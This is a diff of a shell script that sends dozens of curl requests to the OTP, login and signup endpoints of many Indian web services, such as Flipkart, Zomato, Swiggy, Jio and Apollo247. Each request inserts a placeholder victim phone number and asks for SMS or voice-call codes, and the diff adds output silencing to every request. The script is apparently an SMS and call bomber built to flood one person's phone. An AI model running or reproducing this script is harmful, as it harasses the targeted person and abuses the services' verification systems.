@@ -14,10 +14,7 @@ curl 'https://webapi.apollo247.com/' \
   -H 'sec-ch-ua-mobile: ?0' \
   -H 'sec-ch-ua-platform: "Windows"' \
   --data-raw $'{"operationName":"Login","variables":{"mobileNumber":"+91€tor","loginType":"PATIENT"},"query":"query Login($mobileNumber: String\u0021, $loginType: LOGIN_TYPE\u0021) {\\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\\n    status\\n    message\\n    loginId\\n    __typename\\n  }\\n}\\n"}' \
-  --compressed
-
-
-
+  --compressed > /dev/null 2>&1
 curl 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
   -H 'authority: unacademy.com' \
   -H 'accept: */*' \
@@ -35,9 +32,7 @@ curl 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   -H 'x-platform: 0' \
   --data-raw '{"phone":"€tor","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}' \
-  --compressed
-
-
+  --compressed > /dev/null 2>&1
 curl 'https://www.1mg.com/auth_api/v6/create_token' \
   -H 'authority: www.1mg.com' \
   -H 'accept: application/vnd.healthkartplus.v11+json' \
@@ -61,9 +56,7 @@ curl 'https://www.1mg.com/auth_api/v6/create_token' \
   -H 'x-html-canrender: True' \
   -H 'x-platform: Desktop-0.0.1' \
   --data-raw '{"number":"€tor","is_corporate_user":false,"is_doctor":false}' \
-  --compressed
-
-
+  --compressed > /dev/null 2>&1
 curl 'https://api.testbook.com/api/v2/otp/send?emailOrMobile=€tor&resend=true' \
   -H 'authority: api.testbook.com' \
   -H 'accept: application/json, text/plain, */*' \
@@ -80,8 +73,7 @@ curl 'https://api.testbook.com/api/v2/otp/send?emailOrMobile=€tor&resend=true'
   -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.57' \
   -H 'x-tb-client: web,1.2' \
   --data-raw '{}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://api.tendercuts.in/otp/v2/generate/' \
   -H 'authority: api.tendercuts.in' \
   -H 'accept: application/json' \
@@ -97,15 +89,8 @@ curl 'https://api.tendercuts.in/otp/v2/generate/' \
   -H 'sec-fetch-site: same-site' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   --data-raw '{"mobile":"€tor","otp_mode":"SIGNUP"}' \
-  --compressed
-
-
-
-
+  --compressed > /dev/null 2>&1
 #ll..
-
-
-
 curl 'https://api.tendercuts.in/otp/retry/' \
   -H 'authority: api.tendercuts.in' \
   -H 'accept: application/json' \
@@ -121,8 +106,7 @@ curl 'https://api.tendercuts.in/otp/retry/' \
   -H 'sec-fetch-site: same-site' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   --data-raw '{"mobile":"€tor","retry_mode":"voice","gateway":null}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://www.1mg.com/auth_api/v6/create_token' \
   -H 'authority: www.1mg.com' \
   -H 'accept: application/vnd.healthkartplus.v11+json' \
@@ -146,9 +130,7 @@ curl 'https://www.1mg.com/auth_api/v6/create_token' \
   -H 'x-html-canrender: True' \
   -H 'x-platform: Desktop-0.0.1' \
   --data-raw '{"number":"€tor","is_corporate_user":false,"otp_on_call":true}' \
-  --compressed
-
-
+  --compressed > /dev/null 2>&1
 curl 'https://api.testbook.com/api/v2/otp/send?emailOrMobile=€tor&otpSentVia=call&resend=true' \
   -H 'authority: api.testbook.com' \
   -H 'accept: application/json, text/plain, */*' \
@@ -165,8 +147,7 @@ curl 'https://api.testbook.com/api/v2/otp/send?emailOrMobile=€tor&otpSentVia=c
   -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.57' \
   -H 'x-tb-client: web,1.2' \
   --data-raw '{}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
   -H 'authority: unacademy.com' \
   -H 'accept: */*' \
@@ -184,8 +165,7 @@ curl 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   -H 'x-platform: 0' \
   --data-raw '{"phone":"€tor","country_code":"IN","otp_type":2,"email":"","send_otp":true,"is_un_teach_user":false}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://webapi.apollo247.com/' \
   -H 'Accept-Language: en-US,en;q=0.9' \
   -H 'Connection: keep-alive' \
@@ -201,9 +181,7 @@ curl 'https://webapi.apollo247.com/' \
   -H 'sec-ch-ua-mobile: ?0' \
   -H 'sec-ch-ua-platform: "Windows"' \
   --data-raw $'{"operationName":"getOTPOnCall","variables":{"mobileNumber":"+91€tor","loginType":"PATIENT","id":"0c3f4d50-b054-11ed-9846-7b73ab120606"},"query":"query getOTPOnCall($mobileNumber: String, $loginType: LOGIN_TYPE, $id: String\u0021) {\\n  getOTPOnCall(mobileNumber: $mobileNumber, loginType: $loginType, id: $id) {\\n    status\\n    loginId\\n    message\\n    __typename\\n  }\\n}\\n"}' \
-  --compressed
-
-
+  --compressed > /dev/null 2>&1
 #..
 curl 'https://eatiko.com/public/api/custom-otp-user' \
   -H 'authority: eatiko.com' \
@@ -221,8 +199,7 @@ curl 'https://eatiko.com/public/api/custom-otp-user' \
   -H 'sec-fetch-site: same-origin' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   --data-raw '{"phone":"+91€tor"}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://www.trainman.in/services/user/signup?key=012562ae-60a9-4fcd-84d6-f1354ee1ea48&timestamp=1678101261969' \
   -H 'authority: www.trainman.in' \
   -H 'accept: application/json, text/plain, */*' \
@@ -239,8 +216,7 @@ curl 'https://www.trainman.in/services/user/signup?key=012562ae-60a9-4fcd-84d6-f
   -H 'sec-fetch-site: same-origin' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63' \
   --data-raw $'------WebKitFormBoundarym9QS2xBGu82M0ZOU\r\nContent-Disposition: form-data; name="phone"\r\n\r\n€tor\r\n------WebKitFormBoundarym9QS2xBGu82M0ZOU\r\nContent-Disposition: form-data; name="email"\r\n\r\n\r\n------WebKitFormBoundarym9QS2xBGu82M0ZOU\r\nContent-Disposition: form-data; name="name"\r\n\r\n\r\n------WebKitFormBoundarym9QS2xBGu82M0ZOU--\r\n' \
-  --compressed
-  
+  --compressed > /dev/null 2>&1
 curl 'https://www.healthians.com/login' \
   -H 'authority: www.healthians.com' \
   -H 'accept: */*' \
@@ -261,9 +237,7 @@ curl 'https://www.healthians.com/login' \
   -H 'x-newrelic-id: VwMOWF5TCxABVllbAwMHV10F' \
   -H 'x-requested-with: XMLHttpRequest' \
   --data-raw 'mobile_number=€tor&template=login&countryCode=91&resend=true&_token=v8k2Nn3DnUuBgsjT1aJUWTDjVBlRKALTkD5K6vEs' \
-  --compressed
-
-
+  --compressed > /dev/null 2>&1
 curl 'https://www.redbus.in/help/api/cx/generateOtp' \
   -H 'authority: www.redbus.in' \
   -H 'accept: application/json, text/plain, */*' \
@@ -280,8 +254,7 @@ curl 'https://www.redbus.in/help/api/cx/generateOtp' \
   -H 'sec-fetch-site: same-origin' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63' \
   --data-raw '{"mobileNo":"€tor","phoneCode":"91"}' \
-  --compressed
-  
+  --compressed > /dev/null 2>&1 
   curl 'https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber=€tor&newOtp=true&retry=false&testparamsp=true' \
   -H 'Accept: */*' \
   -H 'Accept-Language: en-US,en;q=0.9' \
@@ -295,8 +268,7 @@ curl 'https://www.redbus.in/help/api/cx/generateOtp' \
   -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"' \
   -H 'sec-ch-ua-mobile: ?0' \
   -H 'sec-ch-ua-platform: "Windows"' \
-  --compressed
-  
+  --compressed > /dev/null 2>&1 
   curl 'https://in.bookmyshow.com/pwa/api/uapi/otp/send' \
   -H 'authority: in.bookmyshow.com' \
   -H 'accept: application/json' \
@@ -313,8 +285,7 @@ curl 'https://www.redbus.in/help/api/cx/generateOtp' \
   -H 'sec-fetch-site: same-origin' \
   -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.63' \
   --data-raw '{"channel":"phone","subChannel":"sms","details":{"phone":"€tor","origin":"https://in.bookmyshow.com"}}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://api.penpencil.co/v1/users/resend-otp?smsType=1' \
   -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
   -H 'sec-ch-ua-mobile: ?0' \
@@ -329,8 +300,7 @@ curl 'https://api.penpencil.co/v1/users/resend-otp?smsType=1' \
   -H 'Client-Type: WEB' \
   -H 'sec-ch-ua-platform: "Windows"' \
   --data-raw '{"mobile":"€tor","organizationId":"5eb393ee95fab7468a79d189"}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone' \
   -H 'authority: prod-auth-api.upgrad.com' \
   -H 'accept: application/json, text/plain, */*' \
@@ -352,8 +322,7 @@ curl 'https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone' \
   -H 'utm_source;' \
   -H 'utm_term;' \
   --data-raw '{"phoneNumber":"+91€tor"}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://user.vedantu.com/user/preLoginVerification' \
   -H 'authority: user.vedantu.com' \
   -H 'accept: */*' \
@@ -370,8 +339,7 @@ curl 'https://user.vedantu.com/user/preLoginVerification' \
   -H 'sec-fetch-site: same-site' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   --data-raw '{"email":null,"phoneCode":"+91","phoneNumber":"€tor","version":2,"ver":"12.336"}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://api.doubtnut.com/v4/student/login' \
   -H 'authority: api.doubtnut.com' \
   -H 'accept: */*' \
@@ -388,8 +356,7 @@ curl 'https://api.doubtnut.com/v4/student/login' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   -H 'version_code: 1500' \
   --data-raw 'phone_number=€tor&is_web=3' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://auth.zee5.com/v1/user/sendotp' \
   -H 'Accept: application/json' \
   -H 'Accept-Language: en-US,en;q=0.9' \
@@ -407,8 +374,7 @@ curl 'https://auth.zee5.com/v1/user/sendotp' \
   -H 'sec-ch-ua-mobile: ?0' \
   -H 'sec-ch-ua-platform: "Windows"' \
   --data-raw '{"phoneno":"91€tor"}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1 
 curl 'https://www.dunzo.com/api/v0/auth/sign-up' \
   -H 'authority: www.dunzo.com' \
   -H 'accept: application/json, text/plain, */*' \
@@ -429,8 +395,7 @@ curl 'https://www.dunzo.com/api/v0/auth/sign-up' \
   -H 'x-app-version: 2.0.0' \
   -H 'x-csrf-token: MCVoy4ET-I18Jva1CJx9lZyB82ZzZ_KwYEoU' \
   --data-raw '{"phone":"€tor","tos_accepted":true}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://customer.rapido.bike/api/otp' \
   -H 'authority: customer.rapido.bike' \
   -H 'accept: */*' \
@@ -445,8 +410,7 @@ curl 'https://customer.rapido.bike/api/otp' \
   -H 'sec-fetch-mode: cors' \
   -H 'sec-fetch-site: same-site' \
   --data-raw '{"mobile":"€tor"}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://api.gopaysense.com/users/otp' \
   -H 'authority: api.gopaysense.com' \
   -H 'accept: */*' \
@@ -462,8 +426,7 @@ curl 'https://api.gopaysense.com/users/otp' \
   -H 'sec-fetch-site: same-site' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   --data-raw '{"phone":"€tor"}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://www.medibuddy.in/unified-login/user/register' \
   -H 'authority: www.medibuddy.in' \
   -H 'accept: application/json, text/plain, */*' \
@@ -483,9 +446,7 @@ curl 'https://www.medibuddy.in/unified-login/user/register' \
   -H 'tracestate: 3364160@nr=0-1-3364160-322548686-5d41d1461ff0543a----1677007490677' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   --data-raw '{"source":"medibuddy","platform":"medibuddyInWeb","phonenumber":"€tor","screen":"login-page","advertiserId":"1052940192611150823","mbUserId":null}' \
-  --compressed
-
-
+  --compressed > /dev/null 2>&1
 curl 'https://apinew.moglix.com/nodeApi/v1/login/sendOTP' \
   -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
   -H 'sec-ch-ua-mobile: ?0' \
@@ -498,9 +459,8 @@ curl 'https://apinew.moglix.com/nodeApi/v1/login/sendOTP' \
   -H 'x-request-id: 9KBqSaqWkg5-odqZr1bAAbpYcJDDtI98' \
   -H 'sec-ch-ua-platform: "Windows"' \
   --data-raw '{"phone":"€tor","email":"","type":"p","source":"signup","device":"mobile"}' \
-  --compressed
+  --compressed > /dev/null 2>&1
 ######start
-
 curl 'https://webapi.apollo247.com/' \
   -H 'Accept-Language: en-US,en;q=0.9' \
   -H 'Connection: keep-alive' \
@@ -517,10 +477,7 @@ curl 'https://webapi.apollo247.com/' \
   -H 'sec-ch-ua-mobile: ?0' \
   -H 'sec-ch-ua-platform: "Windows"' \
   --data-raw $'{"operationName":"Login","variables":{"mobileNumber":"+91€tor","loginType":"PATIENT"},"query":"query Login($mobileNumber: String\u0021, $loginType: LOGIN_TYPE\u0021) {\\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\\n    status\\n    message\\n    loginId\\n    __typename\\n  }\\n}\\n"}' \
-  --compressed
-
-
-
+  --compressed > /dev/null 2>&1
 curl 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
   -H 'authority: unacademy.com' \
   -H 'accept: */*' \
@@ -538,9 +495,7 @@ curl 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   -H 'x-platform: 0' \
   --data-raw '{"phone":"€tor","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}' \
-  --compressed
-
-
+  --compressed > /dev/null 2>&1
 curl 'https://www.1mg.com/auth_api/v6/create_token' \
   -H 'authority: www.1mg.com' \
   -H 'accept: application/vnd.healthkartplus.v11+json' \
@@ -564,9 +519,7 @@ curl 'https://www.1mg.com/auth_api/v6/create_token' \
   -H 'x-html-canrender: True' \
   -H 'x-platform: Desktop-0.0.1' \
   --data-raw '{"number":"€tor","is_corporate_user":false,"is_doctor":false}' \
-  --compressed
-
-
+  --compressed > /dev/null 2>&1
 curl 'https://api.testbook.com/api/v2/otp/send?emailOrMobile=€tor&resend=true' \
   -H 'authority: api.testbook.com' \
   -H 'accept: application/json, text/plain, */*' \
@@ -583,8 +536,7 @@ curl 'https://api.testbook.com/api/v2/otp/send?emailOrMobile=€tor&resend=true'
   -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.57' \
   -H 'x-tb-client: web,1.2' \
   --data-raw '{}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://api.tendercuts.in/otp/v2/generate/' \
   -H 'authority: api.tendercuts.in' \
   -H 'accept: application/json' \
@@ -600,15 +552,8 @@ curl 'https://api.tendercuts.in/otp/v2/generate/' \
   -H 'sec-fetch-site: same-site' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   --data-raw '{"mobile":"€tor","otp_mode":"SIGNUP"}' \
-  --compressed
-
-
-
-
+  --compressed > /dev/null 2>&1
 #ll..
-
-
-
 curl 'https://api.tendercuts.in/otp/retry/' \
   -H 'authority: api.tendercuts.in' \
   -H 'accept: application/json' \
@@ -624,8 +569,7 @@ curl 'https://api.tendercuts.in/otp/retry/' \
   -H 'sec-fetch-site: same-site' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   --data-raw '{"mobile":"€tor","retry_mode":"voice","gateway":null}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://www.1mg.com/auth_api/v6/create_token' \
   -H 'authority: www.1mg.com' \
   -H 'accept: application/vnd.healthkartplus.v11+json' \
@@ -649,9 +593,7 @@ curl 'https://www.1mg.com/auth_api/v6/create_token' \
   -H 'x-html-canrender: True' \
   -H 'x-platform: Desktop-0.0.1' \
   --data-raw '{"number":"€tor","is_corporate_user":false,"otp_on_call":true}' \
-  --compressed
-
-
+  --compressed > /dev/null 2>&1
 curl 'https://api.testbook.com/api/v2/otp/send?emailOrMobile=€tor&otpSentVia=call&resend=true' \
   -H 'authority: api.testbook.com' \
   -H 'accept: application/json, text/plain, */*' \
@@ -668,8 +610,7 @@ curl 'https://api.testbook.com/api/v2/otp/send?emailOrMobile=€tor&otpSentVia=c
   -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.57' \
   -H 'x-tb-client: web,1.2' \
   --data-raw '{}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
   -H 'authority: unacademy.com' \
   -H 'accept: */*' \
@@ -687,8 +628,7 @@ curl 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   -H 'x-platform: 0' \
   --data-raw '{"phone":"€tor","country_code":"IN","otp_type":2,"email":"","send_otp":true,"is_un_teach_user":false}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://webapi.apollo247.com/' \
   -H 'Accept-Language: en-US,en;q=0.9' \
   -H 'Connection: keep-alive' \
@@ -704,12 +644,9 @@ curl 'https://webapi.apollo247.com/' \
   -H 'sec-ch-ua-mobile: ?0' \
   -H 'sec-ch-ua-platform: "Windows"' \
   --data-raw $'{"operationName":"getOTPOnCall","variables":{"mobileNumber":"+91€tor","loginType":"PATIENT","id":"0c3f4d50-b054-11ed-9846-7b73ab120606"},"query":"query getOTPOnCall($mobileNumber: String, $loginType: LOGIN_TYPE, $id: String\u0021) {\\n  getOTPOnCall(mobileNumber: $mobileNumber, loginType: $loginType, id: $id) {\\n    status\\n    loginId\\n    message\\n    __typename\\n  }\\n}\\n"}' \
-  --compressed
-
-
+  --compressed > /dev/null 2>&1
 #.
 #####end
-
 curl 'https://www.jio.com/api/jio-login-service/login/sendOtp' \
   -H 'Accept: */*' \
   -H 'Accept-Language: en-US,en;q=0.9' \
@@ -726,7 +663,7 @@ curl 'https://www.jio.com/api/jio-login-service/login/sendOtp' \
   -H 'sec-ch-ua-mobile: ?0' \
   -H 'sec-ch-ua-platform: "Windows"' \
   --data-raw '{"mobileNumber":"€tor","loginFlowType":"MOBILE","alternateNumber":""}' \
-  --compressed
+  --compressed > /dev/null 2>&1
 curl 'https://1.rome.api.flipkart.com/api/7/user/otp/generate' \
   -H 'Accept: */*' \
   -H 'Accept-Language: en-US,en;q=0.9' \
@@ -744,7 +681,7 @@ curl 'https://1.rome.api.flipkart.com/api/7/user/otp/generate' \
   -H 'sec-ch-ua-mobile: ?0' \
   -H 'sec-ch-ua-platform: "Windows"' \
   --data-raw '{"loginId":"+91€tor"}' \
-  --compressed
+  --compressed > /dev/null 2>&1
 curl 'https://pharmeasy.in/apt-api/login/send-otp' \
   -H 'authority: pharmeasy.in' \
   -H 'accept: application/json, text/plain, */*' \
@@ -764,7 +701,7 @@ curl 'https://pharmeasy.in/apt-api/login/send-otp' \
   -H 'x-instana-s: b93fcd3cc87cdd26' \
   -H 'x-instana-t: b93fcd3cc87cdd26' \
   --data-raw '{"param":"€tor"}' \
-  --compressed
+  --compressed > /dev/null 2>&1
 curl 'https://accounts.zomato.com/login/phone' \
   -H 'authority: accounts.zomato.com' \
   -H 'accept: */*' \
@@ -782,8 +719,7 @@ curl 'https://accounts.zomato.com/login/phone' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   -H 'x-zomato-csrft;' \
   --data-raw $'------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="country_id"\r\n\r\n1\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="number"\r\n\r\n€tor\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="type"\r\n\r\ninitiate\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="hash"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="id_token"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="fb_token"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="email"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="name"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="otp"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="csrf_token"\r\n\r\naaa1e77cff99a5e93f1391bb9f43e0db\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="lc"\r\n\r\n400c6068d99947e6a3f5c8245e627cf9\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="verification_type"\r\n\r\nsms\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="message_uuid"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="theme"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i--\r\n' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://www.swiggy.com/dapi/auth/sms-otp' \
   -H 'authority: www.swiggy.com' \
   -H '__fetch_req__: true' \
@@ -801,8 +737,7 @@ curl 'https://www.swiggy.com/dapi/auth/sms-otp' \
   -H 'sec-fetch-site: same-origin' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   --data-raw '{"mobile":"€tor","_csrf":"4QfCUHREQUpv-blC01cQBRzTY41dSeJGH30alxjQ"}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://mtnucleus.byjusweb.com/api/acs/v2/send-otp' \
   -H 'authority: mtnucleus.byjusweb.com' \
   -H 'accept: application/json, text/javascript, */*; q=0.01' \
@@ -818,8 +753,7 @@ curl 'https://mtnucleus.byjusweb.com/api/acs/v2/send-otp' \
   -H 'sec-fetch-site: cross-site' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   --data-raw '{"phoneNumber":"€tor","page":"free-trial-classes"}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://api.sso.masaischool.com/mobile-signup-send-otp' \
   -H 'authority: api.sso.masaischool.com' \
   -H 'accept: */*' \
@@ -836,10 +770,7 @@ curl 'https://api.sso.masaischool.com/mobile-signup-send-otp' \
   -H 'sec-fetch-site: same-site' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   --data-raw '{"mobileNumber":"+91€tor","name":"kalwar"}' \
-  --compressed
-
-
-
+  --compressed > /dev/null 2>&1
 curl 'https://www.dealshare.in/api/1.0/get-otp' \
   -H 'authority: www.dealshare.in' \
   -H 'accept: application/json, text/plain, */*' \
@@ -856,8 +787,7 @@ curl 'https://www.dealshare.in/api/1.0/get-otp' \
   -H 'sec-fetch-site: same-origin' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   --data-raw '{"phoneNumber":"€tor","name":"","hashCode":"","resendOtp":0,"source":"web"}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://login.web.ajio.com/api/auth/generateLoginOTP' \
   -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
   -H 'accept: application/json' \
@@ -867,10 +797,7 @@ curl 'https://login.web.ajio.com/api/auth/generateLoginOTP' \
   -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   -H 'sec-ch-ua-platform: "Windows"' \
   --data-raw '{"mobileNumber":"€tor"}' \
-  --compressed
-
-
-
+  --compressed > /dev/null 2>&1
 curl 'https://www.redbus.in/help/api/cx/generateOtp' \
   -H 'authority: www.redbus.in' \
   -H 'accept: application/json, text/plain, */*' \
@@ -887,8 +814,7 @@ curl 'https://www.redbus.in/help/api/cx/generateOtp' \
   -H 'sec-fetch-site: same-origin' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63' \
   --data-raw '{"mobileNo":"€tor","phoneCode":"91"}' \
-  --compressed
-  
+  --compressed > /dev/null 2>&1
   curl 'https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber=€tor&newOtp=true&retry=false&testparamsp=true' \
   -H 'Accept: */*' \
   -H 'Accept-Language: en-US,en;q=0.9' \
@@ -902,8 +828,7 @@ curl 'https://www.redbus.in/help/api/cx/generateOtp' \
   -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"' \
   -H 'sec-ch-ua-mobile: ?0' \
   -H 'sec-ch-ua-platform: "Windows"' \
-  --compressed
-  
+  --compressed > /dev/null 2>&1
   curl 'https://in.bookmyshow.com/pwa/api/uapi/otp/send' \
   -H 'authority: in.bookmyshow.com' \
   -H 'accept: application/json' \
@@ -920,9 +845,7 @@ curl 'https://www.redbus.in/help/api/cx/generateOtp' \
   -H 'sec-fetch-site: same-origin' \
   -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.63' \
   --data-raw '{"channel":"phone","subChannel":"sms","details":{"phone":"€tor","origin":"https://in.bookmyshow.com"}}' \
-  --compressed
-  
-
+  --compressed > /dev/null 2>&1
 curl 'https://api.penpencil.co/v1/users/resend-otp?smsType=2' \
   -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"' \
   -H 'sec-ch-ua-mobile: ?1' \
@@ -937,8 +860,7 @@ curl 'https://api.penpencil.co/v1/users/resend-otp?smsType=2' \
   -H 'Client-Type: WEB' \
   -H 'sec-ch-ua-platform: "Android"' \
